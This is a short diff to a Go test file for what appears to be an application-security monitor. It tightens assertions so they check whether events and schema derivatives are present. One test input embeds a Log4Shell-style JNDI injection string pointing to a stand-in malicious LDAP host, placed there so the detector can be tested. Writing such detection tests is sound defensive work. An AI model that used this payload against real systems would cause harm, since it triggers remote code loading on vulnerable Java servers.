@@ -69,8 +69,9 @@ func TestMonitor(t *testing.T) {
 			},
 			"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
 		}
-		events := asm.Monitor(addresses)
-		require.NotNil(t, events)
+		res := asm.Monitor(addresses)
+		require.NotNil(t, res)
+		require.True(t, res.HasEvents())
 	})
 
 	t.Run("api-security", func(t *testing.T) {
@@ -136,7 +137,8 @@ func TestMonitor(t *testing.T) {
 						"query": {"$http_server_vars"},
 					},
 				})
-				require.NotEmpty(t, res.Derivatives)
+				require.NotNil(t, res)
+				require.True(t, res.HasDerivatives())
 				schema, err := json.Marshal(res.Derivatives)
 				require.NoError(t, err)
 				require.Equal(t, tc.schema, string(schema))
